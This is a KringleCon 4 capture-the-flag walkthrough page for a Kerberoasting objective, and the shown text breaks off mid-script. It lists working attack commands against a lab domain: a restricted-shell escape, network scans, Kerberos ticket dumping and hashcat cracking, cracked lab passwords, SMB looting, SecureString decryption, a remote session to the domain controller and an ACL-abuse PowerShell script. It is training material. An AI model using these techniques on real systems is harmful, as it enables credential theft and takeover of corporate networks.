
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../../images/logo.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
    
    
      
        <title>8) Kerberoasting on an Open Fire - Kringlecon 4 - Calling Birds!</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.edf004c2.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
        
          
          
          <meta name="theme-color" content="#e92063">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="pink" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Kringlecon 4 - Calling Birds!" class="md-header__button md-logo" aria-label="Kringlecon 4 - Calling Birds!" data-md-component="logo">
      
  <img src="../../../images/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Kringlecon 4 - Calling Birds!
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              8) Kerberoasting on an Open Fire
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Kringlecon 4 - Calling Birds!" class="md-nav__button md-logo" aria-label="Kringlecon 4 - Calling Birds!" data-md-component="logo">
      
  <img src="../../../images/logo.png" alt="logo">

    </a>
    Kringlecon 4 - Calling Birds!
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="https://www.sharif.org" class="md-nav__link">
        Back to sharif.org
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Objectives
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Objectives" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Objectives
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective1/" class="md-nav__link">
        1) KringleCon Orientation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective2/" class="md-nav__link">
        2) Where in the World is Caramel Santaigo?
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective3/" class="md-nav__link">
        3) Thaw Frost Tower's Entrance
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective4/" class="md-nav__link">
        4) Slot Machine Investigation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective5/" class="md-nav__link">
        5) Strange USB Device
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective6/" class="md-nav__link">
        6) Shellcode Primer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective7/" class="md-nav__link">
        7) Printer Exploitation
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        8) Kerberoasting on an Open Fire
      </a>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective9/" class="md-nav__link">
        9) Splunk!
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective10/" class="md-nav__link">
        10) Now Hiring!
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective11/" class="md-nav__link">
        11) Customer Complaint Analysis
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective12/" class="md-nav__link">
        12) Frost Tower Website Checkup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Objective13/" class="md-nav__link">
        13) FPGA Programming
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Terminals
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Terminals" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Terminals
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal1/" class="md-nav__link">
        Cranberry Pi Terminal
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal2/" class="md-nav__link">
        Exif Metadata
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal3/" class="md-nav__link">
        Grepping for Gold
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal4/" class="md-nav__link">
        Logic Muchers
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal5/" class="md-nav__link">
        IPv6 Sandbox
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal6/" class="md-nav__link">
        Holiday Hero
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal7/" class="md-nav__link">
        Shellcode Primer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal8/" class="md-nav__link">
        HoHo … No
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal9/" class="md-nav__link">
        Yara Analysis
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal10/" class="md-nav__link">
        IMDS Exploration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal11/" class="md-nav__link">
        Strace Ltrace Retrace
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal12/" class="md-nav__link">
        Elf Code Python
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal13/" class="md-nav__link">
        Frostavator
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal14/" class="md-nav__link">
        Bonus! Blue Log4Jack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Terminals/Terminal15/" class="md-nav__link">
        Bonus! Red Log4Jack
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../items/" class="md-nav__link">
        Items
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Hints
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Hints" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Hints
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../ohints/" class="md-nav__link">
        Objectives
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../thints/" class="md-nav__link">
        Terminals
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../map/" class="md-nav__link">
        Map
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../narrative/" class="md-nav__link">
        Narrative
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../music/" class="md-nav__link">
        Music
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../talks/" class="md-nav__link">
        Talks
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../booths/" class="md-nav__link">
        Booths
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../credits/" class="md-nav__link">
        Credits
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../answers/" class="md-nav__link">
        Answers
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

  <h1>8) Kerberoasting on an Open Fire</h1>

<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Objective</label><label for="__tabbed_1_2">Walk-through</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><img alt="Obj" src="../../../images/obj/8/image1.png" /></p>
<div class="admonition info">
<p class="admonition-title">Details</p>
<ul>
<li><em>Objective Link 1</em>: <a href="https://register.elfu.org/">Link</a></li>
<li><em>github files</em>: <a href="https://github.com/Mo4n6/KringleCon4/tree/main/docs/files/obj/8">Link</a></li>
</ul>
</div>
</div>
<div class="tabbed-block">
<p>The terminal challenge for this objective is the terminal "HoHo … No" offered by Eve Snowshoes. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left.</p>
<p>To start this objective register an account on <a href="https://register.elfu.org/">ELFU Portal</a>.</p>
<p><img alt="Obj" src="../../../images/obj/8/image2.png" /></p>
<p>You will be given credential and username/password for the "ELFU University Student Grades Portal".</p>
<p><img alt="Obj" src="../../../images/obj/8/image3.png" /></p>
<p>Connect to the SSH server for "ELFU University Student Grades Portal" using the command <code>ssh oecfccqppq@grades.elfu.org -p 2222</code>.</p>
<p><img alt="Obj" src="../../../images/obj/8/image4.png" /></p>
<p>Escape the Grades Portal by pressing <code>CTRL-D</code>.</p>
<p>Type the following in Python Interpreter to escape to Shell.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a>    <span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">);</span>
</code></pre></div>
<p>Run the command <code>hostname</code> to find the hostname for the device you're on.</p>
<p><img alt="Obj" src="../../../images/obj/8/image5.png" /></p>
<p>Ping the domain name to find the IP address of the DC as shown below:</p>
<p><img alt="Obj" src="../../../images/obj/8/image6.png" /></p>
<p>Based on the above output the Domain Controller name is <code>hhc21-windows-dc.c.holidayhack2021.internal</code> with the IP Address <code>10.128.1.53</code>.</p>
<p>Use the command <code>route</code> to find the networks that are routable from <code>grades.elfu.local</code>.</p>
<p><img alt="Obj" src="../../../images/obj/8/image10.png" /></p>
<p>Use <code>nmap</code> to find the interesting hosts on these networks using the following command:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a>    <span class="n">nmap</span> <span class="mf">10.128.1.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">PS22</span><span class="p">,</span><span class="mi">445</span>
<a id="__codelineno-1-2" name="__codelineno-1-2"></a>    <span class="n">nmap</span> <span class="mf">10.128.2.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">PS22</span><span class="p">,</span><span class="mi">445</span>
<a id="__codelineno-1-3" name="__codelineno-1-3"></a>    <span class="n">nmap</span> <span class="mf">10.128.3.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">PS22</span><span class="p">,</span><span class="mi">445</span>
</code></pre></div>
<p>From the scan you will see two hosts that have port 445 open:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>  hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53) = WINDOWS DC
<a id="__codelineno-2-2" name="__codelineno-2-2"></a>  10.128.3.30 = Appears to be the file server
</code></pre></div>
<p>As per the conference video by <a href="https://www.youtube.com/watch?v=iMh8FTzepU4">Chris Davis</a>, you can use <code>GetUserSPNs.py</code> to dump the SPNs and hashes for the domain.</p>
<p>Modify and use the following command to dump the hashes (change the username/password):</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>    <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">outputfile</span> <span class="n">spns</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.128.1.53</span> <span class="n">elfu</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">oecfccqppq</span><span class="p">:</span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">request</span>
</code></pre></div>
<p>The output is shown below:</p>
<p><img alt="Obj" src="../../../images/obj/8/image7.png" /></p>
<p><img alt="Obj" src="../../../images/obj/8/image8.png" /></p>
<p>The file <code>spns.txt</code> contains the hash for the account <code>elfu_svc</code>.</p>
<p>Now lets create a wordlist using <a href="https://github.com/digininja/CeWL">CeWL</a> by scraping elfu.org website.</p>
<p>To install CeWL run the following command from the shell:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>    <span class="n">Git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">digininja</span><span class="o">/</span><span class="n">CeWL</span>
<a id="__codelineno-4-2" name="__codelineno-4-2"></a>    <span class="n">cd</span> <span class="n">CeWL</span>
<a id="__codelineno-4-3" name="__codelineno-4-3"></a>    <span class="n">bundle</span> <span class="n">install</span>
</code></pre></div>
<p>Run the following command to scrape <code>https://register.elfu.org/register</code>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>    ruby -W0 ./cewl.rb https://register.elfu.org/register -w wordlist.txt --with-numbers
</code></pre></div>
<p>Now get a copy of <code>OneRuleToRuleThemAll.rule</code> password cracking rule set for hashcat by running <code>git clone https://github.com/NotSoSecure/password_cracking_rules</code>.</p>
<div class="admonition note">
<p class="admonition-title">You should have</p>
<ol>
<li>spns.txt, which contains the hashes.</li>
<li>wordlist.txt, which is a wordlist generated by CeWL.</li>
<li>OneRuleToRuleThemAll.rule, rule list for hashcat.</li>
</ol>
</div>
<p>Download <code>Hashcat</code> and run it from the same folder as the above files with the following command:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>    hashcat -m <span class="m">13100</span> -a <span class="m">0</span> <span class="se">\s</span>pns.txt --potfile-disable -r <span class="se">\O</span>neRuleToRuleThemAll.rule --force -O -w <span class="m">4</span> --opencl-device-types <span class="m">1</span>,2 <span class="se">\w</span>ordlist.txt
</code></pre></div>
<p>You will get an output similar to this:</p>
<p><img alt="Obj" src="../../../images/obj/8/image9.png" /></p>
<p>The cracked credential are:</p>
<div class="admonition success">
<p class="admonition-title">Crendetial</p>
<p>Username: ELFU.LOCAL\elfu_svc</p>
<p>Password: Snow2021!</p>
</div>
<p>From the <code>grades.elfu.local</code> device, run <code>pwsh</code> to enter powershell.</p>
<p>List the shares on the file server <code>10.128.3.30</code> by using the <code>elfu_svc</code> account via the  command <code>smbclient -L 10.128.3.30 -U elfu_svc</code>.</p>
<p><img alt="Obj" src="../../../images/obj/8/image11.png" /></p>
<p>You see there is a <code>elfu_svc_shr</code> and <code>research_dep</code> share. The <code>elfu_svc</code> account only grants you access to the <code>elfu_svc_shr</code> share and not the <code>research_dep</code> share.</p>
<p>Connect to the <code>elfu_svc_shr</code> share with the command <code>smbclient -U elfu_svc%Snow2021! //10.128.3.30/elfu_svc_shr</code>.</p>
<p>The 'ls' command will show the files in this share:</p>
<p><img alt="Obj" src="../../../images/obj/8/image12.png" /></p>
<p>Run <code>prompt</code> in the smb console to turn off prompting.</p>
<p>Run <code>mget *</code> to download all the files on the share.</p>
<p>Run the command <code>egrep 'elfu' *</code> to find hardcoded <code>elfu</code> domain credentials.</p>
<p><img alt="Obj" src="../../../images/obj/8/image13.png" />
<img alt="Obj" src="../../../images/obj/8/image14.png" /></p>
<p>The above shows the encoded secure password is stored in file <code>GetProcessInfo.ps</code>.</p>
<p>Use the following commands to decode the encoded SecureString.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>    <span class="err">$</span><span class="n">SecStringPassword</span> <span class="o">=</span> <span class="s2">&quot;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&quot;</span>
<a id="__codelineno-7-2" name="__codelineno-7-2"></a>    <span class="err">$</span><span class="n">aPass</span> <span class="o">=</span> <span class="err">$</span><span class="n">SecStringPassword</span> <span class="o">|</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="o">-</span><span class="n">Key</span> <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">7</span>
<a id="__codelineno-7-3" name="__codelineno-7-3"></a>    <span class="n">ConvertFrom</span><span class="o">-</span><span class="n">SecureString</span> <span class="o">-</span><span class="n">SecureString</span> <span class="err">$</span><span class="n">aPass</span> <span class="o">-</span><span class="n">AsPlainText</span>
</code></pre></div>
<p><img alt="Obj" src="../../../images/obj/8/image15.png" /></p>
<p>The output shows the credential for the user <code>remote_elf</code>.</p>
<div class="admonition success">
<p class="admonition-title">Credential</p>
<p>User: elfu.local\remote_elf</p>
<p>Password: A1d655f7f5d98b10!</p>
</div>
<p>Run the following powershell commands to create a remote PS session to the DC with the above credential:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>    <span class="err">$</span><span class="n">password</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="s2">&quot;A1d655f7f5d98b10!&quot;</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="n">Force</span>
<a id="__codelineno-8-2" name="__codelineno-8-2"></a>    <span class="err">$</span><span class="n">cred</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="o">.</span><span class="n">PSCredential</span> <span class="o">-</span><span class="n">ArgumentList</span> <span class="p">(</span><span class="s2">&quot;elfu.local</span><span class="se">\r</span><span class="s2">emote_elf&quot;</span><span class="p">,</span><span class="err">$</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-8-3" name="__codelineno-8-3"></a>    <span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">hhc21</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">dc</span><span class="o">.</span><span class="n">c</span><span class="o">.</span><span class="n">holidayhack2021</span><span class="o">.</span><span class="n">internal</span>  <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">cred</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">Negotiate</span>
</code></pre></div>
<p>Run <code>Get-ADGroup-Filter *</code> on the DC to get a list of all the AD groups. The output shows that there is a group <code>CN=Research Department,CN=Users,DC=elfu,DC=local</code> which likely has access to the research dep share.</p>
<p><img alt="Obj" src="../../../images/obj/8/image16.png" /></p>
<p>Modify and run the following powershell code on the DC to grant genericAll access to your ELFU grades portal account (replace the username with your ELFU grades portal username):</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>    <span class="c1">#give account &quot;tielcxbxev&quot; GenericAll Permissions Run From remote_employee terminal who has WriteDACL</span>
<a id="__codelineno-9-2" name="__codelineno-9-2"></a>    <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span>
<a id="__codelineno-9-3" name="__codelineno-9-3"></a>    <span class="err">$</span><span class="n">ldapConnString</span> <span class="o">=</span>  <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
<a id="__codelineno-9-4" name="__codelineno-9-4"></a>    <span class="err">$</span><span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;tielcxbxev&quot;</span>
<a id="__codelineno-9-5" name="__codelineno-9-5"></a>    <span class="err">$</span><span class="n">nullGUID</span> <span class="o">=</span> <span class="p">[</span><span class="n">guid</span><span class="p">]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
<a id="__codelineno-9-6" name="__codelineno-9-6"></a>    <span class="err">$</span><span class="n">propGUID</span> <span class="o">=</span> <span class="p">[</span><span class="n">guid</span><span class="p">]</span><span class="s1">&#39;00000000-0000-0000-0000-000000000000&#39;</span>
<a id="__codelineno-9-7" name="__codelineno-9-7"></a>    <span class="err">$</span><span class="n">identityReference</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-9-8" name="__codelineno-9-8"></a>        <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Security</span><span class="o">.</span><span class="n">Principal</span><span class="o">.</span><span class="n">NTAccount</span> <span class="p">(</span><span class="s2">&quot;elfu.local\$username&quot;</span><span class="p">)</span>
<a id="__codelineno-9-9" name="__codelineno-9-9"></a>    <span class="p">)</span><span class="o">.</span><span class="n">Translate</span><span class="p">([</span><span class="n">System</span><span class="o">.</span><span class="n">Security</span><span class="o">.</span><span class="n">Principal</span><span class="o">.</span><span class="n">SecurityIdentifier</span><span class="p">])</span>
<a id="__codelineno-9-10" name="__codelineno-9-10"></a>
<a id="__codelineno-9-11" name="__codelineno-9-11"></a>    <span class="err">$</span><span class="n">inheritanceType</span> <span class="o">=</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">ActiveDirectorySecurityInheritance</span><span class="p">]::</span><span class="kc">None</span>
<a id="__codelineno-9-12" name="__codelineno-9-12"></a>    <span class="err">$</span><span class="n">ACE</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">ActiveDirectoryAccessRule</span> <span class="p">(</span>
<a id="__codelineno-9-13" name="__codelineno-9-13"></a>        <span class="err">$</span><span class="n">IdentityReference</span><span class="p">,</span>
<a id="__codelineno-9-14" name="__codelineno-9-14"></a>        <span class="p">([</span><span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">ActiveDirectoryRights</span><span class="p">]</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">),</span>
<a id="__codelineno-9-15" name="__codelineno-9-15"></a>        <span class="p">([</span><span class="n">System</span><span class="o">.</span><span class="n">Security</span><span class="o">.</span><span class="n">AccessControl</span><span class="o">.</span><span class="n">AccessControlType</span><span class="p">]</span> <span class="s2">&quot;Allow&quot;</span><span class="p">),</span>
<a id="__codelineno-9-16" name="__codelineno-9-16"></a>        <span class="err">$</span><span class="n">propGUID</span><span class="p">,</span> <span class="err">$</span><span class="n">inheritanceType</span><span class="p">,</span> <span class="err">$</span><span class="n">nullGUID</span>
<a id="__codelineno-9-17" name="__codelineno-9-17"></a>    <span class="p">)</span>
